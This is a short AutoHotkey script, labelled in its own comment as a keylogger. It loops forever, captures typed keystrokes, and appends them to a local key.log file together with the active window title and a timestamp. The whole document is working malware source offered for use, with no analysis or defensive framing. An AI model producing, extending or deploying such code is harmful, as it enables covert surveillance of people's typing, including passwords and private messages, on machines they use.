Loop {                                              ; Keylogger that also records page title and time.
  Input, k , V T5
  FormatTime, t ,, MM-dd-yyyy  hh:mm:ss tt
  WinGetActiveTitle , pt
  pttk = `n`n`n****************`n%pt%`n%t%`n`n%k%   ;    Defines variable pttk: page title, time, keys logged
  k:=pt!=pt2 ? pttk :k                              ;    Sets value of k to either pttk or k. 
  FileAppend, %k% , key.log
  pt2 := pt
}